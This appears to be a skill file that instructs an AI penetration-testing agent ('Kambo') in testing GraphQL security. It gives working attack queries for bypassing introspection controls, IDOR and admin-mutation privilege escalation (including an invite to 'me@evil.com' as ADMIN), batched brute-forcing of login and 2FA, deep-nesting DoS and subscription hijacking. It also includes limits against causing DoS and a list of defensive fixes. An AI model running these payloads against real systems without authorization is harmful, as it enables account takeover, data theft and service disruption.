---
name: kambo-graphql
description: GraphQL-specific security testing — introspection dumping, query batching abuse, nested query DoS, field-level authorization bypass, mutation abuse, and subscription hijacking. GraphQL's flexibility is its vulnerability — clients can request anything the schema exposes. Use when the target has a GraphQL endpoint (/graphql, /gql, /query), when scan_api_endpoints discovers GraphQL, or when the user says "GraphQL", "introspection", "query batching", "nested queries", "graphql security".
triggers:
  - graphql
  - graphql security
  - introspection
  - query batching
  - nested queries
  - graphql endpoint
  - gql
---

# Kambo GraphQL — GraphQL Security Testing

GraphQL gives the client the keys to the query engine. Your job is to find out what they forgot to lock.

Unlike REST where the server defines what you get, GraphQL lets the client define
what to ask for. This inversion of control is the root of every GraphQL vulnerability —
the server trusts the client to be reasonable, and you're not going to be reasonable.

## When to Use

- When `scan_api_endpoints` discovers `/graphql`, `/gql`, `/query`, or `/api/graphql`
- When `/kambo-js-hunt` finds GraphQL client libraries or query strings in JS
- When `recon_tech_stack` identifies Apollo, Hasura, graphql-yoga, or similar
- When the target is a modern SPA (React/Vue/Angular) — high likelihood of GraphQL

## Phase 1: GraphQL Discovery & Introspection

### 1.1 — Endpoint Discovery

```
COMMON GRAPHQL PATHS:
  /graphql
  /gql
  /query
  /api/graphql
  /api/gql
  /v1/graphql
  /graphql/v1
  /playground
  /graphiql
  /altair
  /voyager

Check each path with:
  POST with body: {"query": "{__typename}"}
  Content-Type: application/json

  IF response contains {"data": {"__typename": "Query"}}
    → GraphQL endpoint confirmed

ALSO CHECK:
  GET /graphql?query={__typename}  (some servers accept GET)
  WebSocket ws://target/graphql   (subscriptions endpoint)
```

### 1.2 — Introspection Query

The first thing to try — many production servers still have introspection enabled:

```
FULL INTROSPECTION QUERY:
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}

IF INTROSPECTION ENABLED:
  → This is a finding by itself (information disclosure, MEDIUM)
  → You now have the COMPLETE schema — every type, field, mutation
  → Extract: all queries, mutations, subscriptions, types
  → Identify: admin/internal types, sensitive fields, hidden mutations

IF INTROSPECTION DISABLED (403/error):
  → Try introspection bypass techniques (Phase 1.3)
  → Fall back to field suggestion and schema reconstruction
```

### 1.3 — Introspection Bypass

```
BYPASS TECHNIQUES:

  1. GET instead of POST:
     GET /graphql?query={__schema{types{name}}}

  2. Alias obfuscation:
     {a:__schema{types{name}}}

  3. Newline injection:
     {"query": "{\n__schema\n{\ntypes\n{\nname\n}\n}\n}"}

  4. Different content types:
     Content-Type: application/x-www-form-urlencoded
     query={__schema{types{name}}}

  5. Batch query wrapping:
     [{"query":"{__typename}"},{"query":"{__schema{types{name}}}"}]

  6. Partial introspection:
     {__type(name:"User"){fields{name type{name}}}}
     (query type by name — may work when full __schema is blocked)

  7. Field suggestion abuse:
     Send invalid field name → error may suggest valid fields
     {"query":"{usrs{id}}"} → "Did you mean 'users'?"
     Iterate to reconstruct the schema
```

### 1.4 — Schema Reconstruction (No Introspection)

If introspection is fully disabled, reconstruct the schema manually:

```
TECHNIQUE 1: Error-based field discovery
  Send: {user{AAAA}}
  Error: "Cannot query field 'AAAA' on type 'User'. 
          Did you mean 'name', 'email', 'role'?"
  → Extract suggested fields from error messages

TECHNIQUE 2: JS bundle analysis
  Run /kambo-js-hunt → look for:
  - gql`` template literals with query definitions
  - .graphql files in source maps
  - Apollo Client cache normalization (reveals type names)
  - Generated TypeScript types (reveals full schema)

TECHNIQUE 3: Wordlist fuzzing
  Use common GraphQL field names:
  id, name, email, password, role, admin, token, secret,
  createdAt, updatedAt, deletedAt, status, type, permissions,
  users, posts, comments, orders, payments, invoices, settings

  For each: {TYPE{field}} — if 200 OK → field exists
```

## Phase 2: Authorization Testing

The most common GraphQL vuln — field-level auth is often missing.

### 2.1 — Horizontal Access (BOLA/IDOR)

```
TEST: Can I access other users' data?

  Query as User A:
    {user(id: "user-a-id") { name email ssn }}
  
  Change to User B's ID:
    {user(id: "user-b-id") { name email ssn }}
  
  IF returns User B's data → IDOR confirmed

ALSO TEST:
  - Sequential IDs: user(id: 1), user(id: 2), user(id: 3)
  - UUID prediction: if UUIDs are v1, they're time-based and predictable
  - Nested access: {me { organization { users { email ssn } } }}
    (access other users via shared organization)

TOOLS: api_test_bola can help, but GraphQL needs specific query format
```

### 2.2 — Vertical Access (BFLA)

```
TEST: Can I access admin-only queries/mutations?

  From introspection, identify admin types:
    AdminUser, AdminDashboard, SystemConfig, AuditLog, etc.

  Try accessing as regular user:
    {adminUsers { id name email permissions }}
    {systemConfig { databaseUrl apiKeys }}
    {auditLog(limit: 100) { action user timestamp }}

  Try admin mutations:
    mutation { deleteUser(id: "victim") { success } }
    mutation { updateRole(userId: "me", role: ADMIN) { success } }
    mutation { updateSystemConfig(key: "debug", value: "true") { success } }

IF any admin operation succeeds → BFLA confirmed (HIGH-CRITICAL)
```

### 2.3 — Field-Level Authorization

```
TEST: Can I request sensitive fields that should be restricted?

  Regular query:
    {me { name email }}
  
  Add sensitive fields:
    {me { name email ssn creditCard passwordHash internalId }}
  
  Try on other users:
    {user(id: "other") { name email role isAdmin lastLoginIp }}

  GraphQL's field selection means the CLIENT chooses what to retrieve.
  If the server doesn't check field-by-field auth, everything is exposed.

COMMON SENSITIVE FIELDS:
  password, passwordHash, salt, secret, token, apiKey, ssn,
  creditCard, internalNotes, adminNotes, deletedAt (soft-deleted data),
  metadata, rawData, debugInfo, logs
```

### 2.4 — Mutation Authorization

```
TEST: Can I perform unauthorized mutations?

  Mass assignment via mutation:
    mutation { updateUser(id: "me", role: "admin", verified: true) { id role } }
  
  Accessing restricted mutations:
    mutation { createApiKey(scope: "admin") { key } }
    mutation { exportData(format: "csv", all: true) { downloadUrl } }
    mutation { inviteUser(email: "me@evil.com", role: "ADMIN") { success } }

  Input object abuse:
    mutation { updateProfile(input: {name: "test", isAdmin: true}) { isAdmin } }
    (add fields to the input that shouldn't be user-controllable)

TOOLS: api_test_bfla, api_test_bopla for mutation auth testing
```

## Phase 3: Abuse Patterns

### 3.1 — Query Batching

```
TECHNIQUE: Send multiple operations in a single request

  BATCH QUERY:
  [
    {"query": "mutation { login(email:\"user@example.com\", password:\"pass1\") { token } }"},
    {"query": "mutation { login(email:\"user@example.com\", password:\"pass2\") { token } }"},
    {"query": "mutation { login(email:\"user@example.com\", password:\"pass3\") { token } }"},
    ...repeat with 100 passwords
  ]

  IF server processes all in one request:
    → Rate limiting bypass (one HTTP request = one rate limit count)
    → Brute force login: 100 passwords per request
    → 2FA bypass: 100 OTP codes per request

  Also test with aliases in single query:
  {
    a1: login(email: "user@example.com", password: "pass1") { token }
    a2: login(email: "user@example.com", password: "pass2") { token }
    a3: login(email: "user@example.com", password: "pass3") { token }
  }
```

### 3.2 — Nested Query Depth Attack

```
TECHNIQUE: Exploit circular references for DoS

  IF schema has: User → posts → author → posts → author → ...

  QUERY:
  {
    users {
      posts {
        author {
          posts {
            author {
              posts {
                author {
                  name
                }
              }
            }
          }
        }
      }
    }
  }

  This creates exponential database queries.
  Depth 7 with 10 users × 10 posts = 10^7 DB queries from one request.

  TEST CAREFULLY:
  - Start with depth 3, measure response time
  - Increase to depth 5, measure again
  - If response time grows exponentially → vulnerable
  - DO NOT send depth 20+ (this is actual DoS)
  - Report based on the exponential growth pattern, not actual crash

  IF server returns error "query too deep":
    → Depth limiting is in place (good defense)
    → But check: is the limit sufficient? (depth 100 still allowed?)
```

### 3.3 — Query Complexity Attack

```
TECHNIQUE: Abuse field multipliers

  QUERY:
  {
    users(first: 1000) {
      posts(first: 1000) {
        comments(first: 1000) {
          author { name }
        }
      }
    }
  }

  Even without circular references, large pagination × nesting = expensive.
  1000 × 1000 × 1000 = 1 billion potential operations.

  IF server doesn't have query cost analysis:
    → Resource consumption vulnerability
    → Can cause slowdown or OOM for other users
    → Report as API4:2023 (Unrestricted Resource Consumption)

  USE api_test_resource to measure response degradation.
```

### 3.4 — Subscription Abuse

```
IF WebSocket subscriptions are available:

  TEST 1: Subscribe to other users' events
    subscription { onUserUpdate(userId: "victim") { name email } }
    → Should only work for your own user

  TEST 2: Subscribe to admin events
    subscription { onSystemAlert { message severity details } }
    → Should require admin auth

  TEST 3: Mass subscriptions
    Open 1000 concurrent subscriptions
    → Does this exhaust server resources?

  TEST 4: Subscription without auth
    Connect to WS without auth token
    → Are subscriptions accessible without authentication?
```

### 3.5 — Directive Abuse

```
GraphQL directives (@skip, @include, @deprecated) can sometimes be abused:

  TEST: Custom directives that modify behavior
    {user(id: 1) { email @admin }}
    {user(id: 1) { email @bypass }}
    {users @export(as: "csv") { name email }}

  TEST: Built-in directive abuse
    {user(id: 1) { secretField @include(if: true) }}
    (sometimes @include bypasses field-level auth)
```

## Phase 4: Reporting

```
KAMBO GRAPHQL SECURITY REPORT
================================
Target: {target}
Endpoint: {graphql_url}
Framework: {Apollo/Hasura/graphql-yoga/custom}

FINDINGS:

  [G1] {severity} — {title}
       Query: {exact GraphQL query}
       Response: {relevant response data}
       Impact: {what an attacker achieves}

  [G2] ...

SCHEMA INTELLIGENCE:
  Introspection: {enabled/disabled/bypassed}
  Types discovered: {count}
  Mutations discovered: {count}
  Admin types found: {list}
  Sensitive fields exposed: {list}

AUTHORIZATION GAPS:
  Horizontal: {IDOR found on X queries}
  Vertical: {admin mutations accessible as user}
  Field-level: {sensitive fields accessible without auth}

ABUSE VECTORS:
  Batching: {allowed/blocked} → {brute force risk}
  Depth: {limit set? / unlimited?} → {DoS risk}
  Complexity: {cost analysis? / unlimited?} → {resource risk}

RECOMMENDATIONS:
  1. Disable introspection in production
  2. Implement field-level authorization
  3. Add query depth limiting (max 10)
  4. Add query cost/complexity analysis
  5. Rate limit by query cost, not just HTTP requests
  6. Validate batch query limits
```

## Integration with Other Skills

| Flow | Integration |
|------|-------------|
| `scan_api_endpoints` → GraphQL found → `/kambo-graphql` | API discovery triggers GraphQL testing |
| `/kambo-js-hunt` → GraphQL queries in JS → `/kambo-graphql` | JS analysis reveals schema structure |
| `/kambo-graphql` → auth bypass → `/kambo-chain` | Chain GraphQL access with other vulns |
| `/kambo-graphql` → finding → `/kambo-confidence` | Validate before reporting |
| `/kambo-waf-evade` → GraphQL behind WAF → `/kambo-graphql` | WAF bypass enables GraphQL testing |
| `/kambo-think-like-defense` → API blindness → `/kambo-graphql` | Defense model identifies GraphQL neglect |

## Anti-Patterns

- **Running depth 20+ nested queries**: this is actual DoS. Demonstrate the vulnerability with depth 5-7 and exponential timing growth. Never crash production.
- **Reporting disabled introspection as "secure"**: introspection is just one vector. Auth bypass, batching abuse, and field exposure don't need introspection.
- **Ignoring mutations**: queries get the attention, but mutations (write operations) are where the real impact is. Always test mutations.
- **Not checking subscriptions**: WebSocket-based GraphQL subscriptions often have weaker auth than HTTP queries. Don't skip them.
- **Assuming field-level auth exists**: many GraphQL implementations do type-level auth but not field-level. Request every field you can find.
